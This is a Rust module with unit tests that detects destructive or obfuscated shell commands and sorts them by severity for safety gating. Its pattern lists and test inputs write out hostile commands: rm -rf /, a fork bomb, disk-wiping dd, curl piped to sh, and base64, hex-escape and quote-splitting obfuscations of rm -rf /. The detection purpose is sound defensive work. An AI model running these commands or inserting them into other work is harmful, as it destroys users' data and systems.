//! Destructive command detection for safety checks
//!
//! Detects potentially dangerous commands that could cause data loss,
//! system damage, or security issues.

use std::collections::HashSet;

/// Result of analyzing a command for safety
#[derive(Debug, Clone)]
pub struct SafetyCheck {
    pub is_destructive: bool,
    pub reasons: Vec<String>,
    pub severity: Severity,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Safe,
    Warning,
    Dangerous,
    Critical,
}

/// Destructive command patterns and their severity
const CRITICAL_COMMANDS: &[(&str, &str)] = &[
    ("rm -rf /", "Removes entire filesystem"),
    ("rm -rf /*", "Removes entire filesystem"),
    ("rm -rf ~", "Removes entire home directory"),
    ("rm -rf ~/*", "Removes entire home directory"),
    (":(){:|:&};:", "Fork bomb - crashes system"),
    ("dd if=/dev/zero of=/dev/sda", "Overwrites disk with zeros"),
    (
        "dd if=/dev/random of=/dev/sda",
        "Overwrites disk with random data",
    ),
    ("mkfs.", "Formats filesystem"),
    ("> /dev/sda", "Destroys disk data"),
    ("chmod -R 777 /", "Removes all file permissions"),
    ("chown -R", "Recursively changes ownership"),
];

const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    ("rm -rf", "Recursive forced deletion"),
    ("rm -fr", "Recursive forced deletion"),
    ("rm -r", "Recursive deletion"),
    ("rmdir", "Directory removal"),
    ("dd if=", "Low-level disk operation"),
    ("mkfs", "Filesystem format"),
    ("fdisk", "Disk partitioning"),
    ("parted", "Disk partitioning"),
    ("kill -9", "Force kill process"),
    ("killall", "Kill multiple processes"),
    ("pkill", "Kill processes by pattern"),
    ("shutdown", "System shutdown"),
    ("reboot", "System reboot"),
    ("init 0", "System halt"),
    ("init 6", "System reboot"),
    ("halt", "System halt"),
    ("poweroff", "System poweroff"),
    (":(){", "Potential fork bomb"),
    ("| sh", "Piping to shell"),
    ("| bash", "Piping to shell"),
    ("| zsh", "Piping to shell"),
    ("curl | sh", "Remote code execution"),
    ("wget | sh", "Remote code execution"),
    ("curl | bash", "Remote code execution"),
    ("wget | bash", "Remote code execution"),
    ("> /dev/", "Writing to device"),
    ("chmod 777", "Overly permissive permissions"),
    ("chmod -R", "Recursive permission change"),
    ("sudo rm", "Privileged deletion"),
    ("sudo dd", "Privileged disk operation"),
    ("sudo mkfs", "Privileged format"),
];

const WARNING_PATTERNS: &[(&str, &str)] = &[
    ("rm ", "File deletion"),
    ("mv ", "File move (can overwrite)"),
    ("cp -f", "Forced copy (overwrites)"),
    ("> ", "File overwrite via redirection"),
    (">>", "File append via redirection"),
    ("truncate", "File truncation"),
    ("shred", "Secure file deletion"),
    ("sudo", "Privileged command"),
    ("su ", "Switch user"),
    ("chmod", "Permission change"),
    ("chown", "Ownership change"),
    ("chgrp", "Group change"),
    ("iptables", "Firewall modification"),
    ("ufw", "Firewall modification"),
    ("systemctl stop", "Service stop"),
    ("systemctl disable", "Service disable"),
    ("service stop", "Service stop"),
    ("crontab -r", "Remove all cron jobs"),
    ("git reset --hard", "Discard git changes"),
    ("git clean -fd", "Remove untracked files"),
    ("git push --force", "Force push (rewrites history)"),
    ("docker rm", "Container removal"),
    ("docker rmi", "Image removal"),
    ("docker system prune", "Docker cleanup"),
    ("npm uninstall", "Package removal"),
    ("pip uninstall", "Package removal"),
    ("brew uninstall", "Package removal"),
    ("apt remove", "Package removal"),
    ("apt purge", "Package removal with config"),
    ("yum remove", "Package removal"),
    ("pacman -R", "Package removal"),
];

impl SafetyCheck {
    /// Analyze a command for potential dangers
    pub fn analyze(command: &str) -> Self {
        let cmd_lower = command.to_lowercase();
        let mut reasons = Vec::new();
        let mut max_severity = Severity::Safe;

        // Check for critical patterns first
        for (pattern, reason) in CRITICAL_COMMANDS {
            if cmd_lower.contains(&pattern.to_lowercase()) {
                reasons.push(format!("CRITICAL: {}", reason));
                max_severity = Severity::Critical;
            }
        }

        // Check for dangerous patterns
        for (pattern, reason) in DANGEROUS_PATTERNS {
            if cmd_lower.contains(&pattern.to_lowercase()) {
                reasons.push(format!("DANGER: {}", reason));
                if max_severity < Severity::Dangerous {
                    max_severity = Severity::Dangerous;
                }
            }
        }

        // Check for warning patterns
        for (pattern, reason) in WARNING_PATTERNS {
            if cmd_lower.contains(&pattern.to_lowercase()) {
                // Avoid duplicate reasons
                let warning = format!("WARNING: {}", reason);
                if !reasons.iter().any(|r| r.contains(reason)) {
                    reasons.push(warning);
                    if max_severity < Severity::Warning {
                        max_severity = Severity::Warning;
                    }
                }
            }
        }

        // Additional heuristic checks
        Self::check_heuristics(command, &mut reasons, &mut max_severity);

        // Deduplicate reasons
        let unique_reasons: Vec<String> = reasons
            .into_iter()
            .collect::<HashSet<_>>()
            .into_iter()
            .collect();

        SafetyCheck {
            is_destructive: max_severity >= Severity::Warning,
            reasons: unique_reasons,
            severity: max_severity,
        }
    }

    fn check_heuristics(command: &str, reasons: &mut Vec<String>, severity: &mut Severity) {
        // Check for commands with wildcards in dangerous contexts
        if command.contains("rm ") && command.contains("*") {
            reasons.push("WARNING: Wildcard deletion".to_string());
            if *severity < Severity::Warning {
                *severity = Severity::Warning;
            }
        }

        // Check for recursive operations on root or home
        if (command.contains("-r") || command.contains("-R"))
            && (command.contains(" /") || command.contains(" ~/"))
        {
            reasons.push("DANGER: Recursive operation on system/home directory".to_string());
            if *severity < Severity::Dangerous {
                *severity = Severity::Dangerous;
            }
        }

        // Check for environment variable manipulation
        if command.contains("export PATH=") && !command.contains("$PATH") {
            reasons.push("WARNING: PATH override (may break shell)".to_string());
            if *severity < Severity::Warning {
                *severity = Severity::Warning;
            }
        }

        // Check for history manipulation
        if command.contains("history -c") || command.contains("HISTFILE=/dev/null") {
            reasons.push("WARNING: History manipulation (suspicious)".to_string());
            if *severity < Severity::Warning {
                *severity = Severity::Warning;
            }
        }

        // Check for obfuscation techniques
        Self::check_obfuscation(command, reasons, severity);
    }

    fn check_obfuscation(command: &str, reasons: &mut Vec<String>, severity: &mut Severity) {
        let cmd_lower = command.to_lowercase();

        // Check for eval which can execute arbitrary code
        if cmd_lower.contains("eval ") || cmd_lower.contains("eval\t") {
            reasons.push("DANGER: eval detected - arbitrary code execution".to_string());
            if *severity < Severity::Dangerous {
                *severity = Severity::Dangerous;
            }
        }

        // Check for base64 decoding piped to shell (common attack vector)
        if (cmd_lower.contains("base64") && cmd_lower.contains("-d"))
            && (cmd_lower.contains("| sh")
                || cmd_lower.contains("|sh")
                || cmd_lower.contains("| bash")
                || cmd_lower.contains("|bash")
                || cmd_lower.contains("| zsh")
                || cmd_lower.contains("|zsh")
                || cmd_lower.contains("| eval")
                || cmd_lower.contains("|eval"))
        {
            reasons.push("CRITICAL: Base64 decoded content piped to shell".to_string());
            *severity = Severity::Critical;
        }

        // Check for command substitution that could hide malicious commands
        if command.contains("$(") || command.contains("`") {
            // Check if the substitution contains dangerous patterns
            let has_dangerous_substitution = DANGEROUS_PATTERNS.iter().any(|(pattern, _)| {
                let pattern_lower = pattern.to_lowercase();
                // Look for patterns inside $() or backticks
                if let Some(start) = command.find("$(")
                    && let Some(end) = command[start..].find(')')
                {
                    let inner = &command[start + 2..start + end];
                    if inner.to_lowercase().contains(&pattern_lower) {
                        return true;
                    }
                }
                // Check backtick substitution
                let parts: Vec<&str> = command.split('`').collect();
                if parts.len() >= 3 {
                    // Content between backticks
                    for (i, part) in parts.iter().enumerate() {
                        if i % 2 == 1 && part.to_lowercase().contains(&pattern_lower) {
                            return true;
                        }
                    }
                }
                false
            });

            if has_dangerous_substitution {
                reasons.push("DANGER: Command substitution contains dangerous pattern".to_string());
                if *severity < Severity::Dangerous {
                    *severity = Severity::Dangerous;
                }
            } else {
                reasons.push("WARNING: Command substitution detected".to_string());
                if *severity < Severity::Warning {
                    *severity = Severity::Warning;
                }
            }
        }

        // Check for hex/octal escape sequences that could hide commands
        if command.contains("\\x") || command.contains("$'\\x") || command.contains("$'\\0") {
            reasons.push("DANGER: Escape sequences detected - possible obfuscation".to_string());
            if *severity < Severity::Dangerous {
                *severity = Severity::Dangerous;
            }
        }

        // Check for string concatenation tricks
        if (command.contains("''") && command.contains("rm"))
            || (command.contains("\"\"") && command.contains("rm"))
        {
            reasons.push("DANGER: String concatenation may hide dangerous command".to_string());
            if *severity < Severity::Dangerous {
                *severity = Severity::Dangerous;
            }
        }

        // Check for variable-based obfuscation
        let obfuscation_patterns = [
            "${",     // Variable expansion
            "$IFS",   // Field separator tricks
            "{,}",    // Brace expansion
            "<<<",    // Here-string
            "printf", // Can be used to construct commands
        ];

        for pattern in obfuscation_patterns {
            if command.contains(pattern) {
                // Only flag if combined with dangerous-looking content
                if cmd_lower.contains("rm")
                    || cmd_lower.contains("dd ")
                    || cmd_lower.contains("mkfs")
                    || cmd_lower.contains("/dev/")
                {
                    reasons.push(format!(
                        "WARNING: {} with dangerous command - possible obfuscation",
                        pattern
                    ));
                    if *severity < Severity::Warning {
                        *severity = Severity::Warning;
                    }
                }
            }
        }

        // Check for multiple commands that might bypass single-command detection
        let separator_count = command.matches(';').count()
            + command.matches("&&").count()
            + command.matches("||").count();
        if separator_count > 2 {
            reasons.push("WARNING: Multiple chained commands".to_string());
            if *severity < Severity::Warning {
                *severity = Severity::Warning;
            }
        }
    }

    /// Returns true if this command should always require confirmation
    pub fn requires_confirmation(&self) -> bool {
        self.severity >= Severity::Warning
    }

    /// Returns true if this command should be blocked entirely
    pub fn should_block(&self) -> bool {
        self.severity == Severity::Critical
    }
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Severity::Safe => write!(f, "safe"),
            Severity::Warning => write!(f, "warning"),
            Severity::Dangerous => write!(f, "dangerous"),
            Severity::Critical => write!(f, "critical"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_rm_rf_root() {
        let check = SafetyCheck::analyze("rm -rf /");
        assert!(check.is_destructive);
        assert_eq!(check.severity, Severity::Critical);
    }

    #[test]
    fn detects_rm_rf() {
        let check = SafetyCheck::analyze("rm -rf ./node_modules");
        assert!(check.is_destructive);
        assert!(check.severity >= Severity::Dangerous);
    }

    #[test]
    fn detects_simple_rm() {
        let check = SafetyCheck::analyze("rm file.txt");
        assert!(check.is_destructive);
        assert_eq!(check.severity, Severity::Warning);
    }

    #[test]
    fn detects_curl_pipe_sh() {
        let check = SafetyCheck::analyze("curl https://example.com/script.sh | sh");
        assert!(check.is_destructive);
        assert!(check.severity >= Severity::Dangerous);
    }

    #[test]
    fn safe_command_passes() {
        let check = SafetyCheck::analyze("ls -la");
        assert!(!check.is_destructive);
        assert_eq!(check.severity, Severity::Safe);
    }

    #[test]
    fn detects_sudo() {
        let check = SafetyCheck::analyze("sudo apt update");
        assert!(check.is_destructive);
        assert!(check.severity >= Severity::Warning);
    }

    #[test]
    fn detects_git_force_push() {
        let check = SafetyCheck::analyze("git push --force origin main");
        assert!(check.is_destructive);
        assert!(check.severity >= Severity::Warning);
    }

    #[test]
    fn detects_eval_obfuscation() {
        let check = SafetyCheck::analyze("eval \"rm -rf /\"");
        assert!(check.is_destructive);
        assert!(check.severity >= Severity::Dangerous);
    }

    #[test]
    fn detects_base64_pipe_to_shell() {
        let check = SafetyCheck::analyze("echo 'cm0gLXJmIC8=' | base64 -d | sh");
        assert!(check.is_destructive);
        assert_eq!(check.severity, Severity::Critical);
    }

    #[test]
    fn detects_command_substitution() {
        let check = SafetyCheck::analyze("$(echo rm) file.txt");
        assert!(check.is_destructive);
        assert!(check.severity >= Severity::Warning);
    }

    #[test]
    fn detects_dangerous_command_substitution() {
        let check = SafetyCheck::analyze("$(rm -rf /)");
        assert!(check.is_destructive);
        assert!(check.severity >= Severity::Dangerous);
    }

    #[test]
    fn detects_backtick_substitution() {
        let check = SafetyCheck::analyze("`rm -rf /`");
        assert!(check.is_destructive);
        assert!(check.severity >= Severity::Dangerous);
    }

    #[test]
    fn detects_hex_escape_obfuscation() {
        let check = SafetyCheck::analyze("$'\\x72\\x6d' -rf /");
        assert!(check.is_destructive);
        assert!(check.severity >= Severity::Dangerous);
    }

    #[test]
    fn detects_string_concatenation_trick() {
        let check = SafetyCheck::analyze("r''m -rf /");
        assert!(check.is_destructive);
        assert!(check.severity >= Severity::Dangerous);
    }

    #[test]
    fn detects_multiple_chained_commands() {
        let check = SafetyCheck::analyze("cmd1; cmd2; cmd3; cmd4");
        assert!(check.is_destructive);
        assert!(check.severity >= Severity::Warning);
    }
}
